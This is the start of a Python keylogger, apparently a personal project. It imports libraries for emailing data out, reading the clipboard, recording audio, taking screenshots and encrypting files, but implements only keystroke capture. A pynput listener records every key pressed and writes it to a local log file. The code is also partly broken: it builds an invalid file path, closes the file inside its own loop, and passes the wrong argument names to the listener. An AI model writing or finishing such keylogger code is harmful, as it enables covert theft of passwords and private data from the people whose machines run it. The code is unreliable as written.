#libraries for keylogger progect 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time

import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet



import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_info = "key_log.txt"

filepath = "C:\\Users\\zmart\\Keylogger\\Keylogger.py"
extend = "\\"

count = 0

keys = []

def press(key):
    global keys, count

    print(key)

    keys.append(key)

    count += 1

    if count >= 1:
        count = 0
        Write_file(keys)
        keys = []

def Write_file(keys):

    with open(filepath + extend + keys_info, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def release(key):
    if key == Key.esc:
        return False

with Listener(press=press, release=release) as listener:
    listener.join()
